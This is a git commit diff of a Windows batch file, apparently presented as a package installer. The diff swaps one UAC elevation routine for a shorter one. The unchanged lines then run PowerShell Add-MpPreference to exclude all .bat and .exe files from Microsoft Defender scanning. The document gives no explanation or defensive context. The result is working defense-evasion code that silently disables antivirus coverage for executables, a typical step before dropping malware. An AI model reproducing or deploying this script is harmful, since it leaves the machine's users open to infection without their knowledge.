a7652964adca42c16d8089050d220c22f37131fe
NHTBOT <140639828+NHTBOT@users.noreply.github.com>
2023-11-09 14:04:16 +0700

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,26 +1,6 @@
 @echo off
-
-title Installing Packages 
-:: BatchGotAdmin
-::-----------------------------------------
-REM  --> CheckING for permissions
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-
-REM --> If error flag set, we do not have admin.
-if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
-    goto UACPrompt
-) else ( goto gotAdmin )
-
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params = %*:"="
-    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-
-:gotAdmin
+@whoami /groups | find "S-1-16-12288" > nul
+@if errorlevel 1 PowerShell Start-Process '%0' -Verb RunAs & exit /b
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
+pause > nul
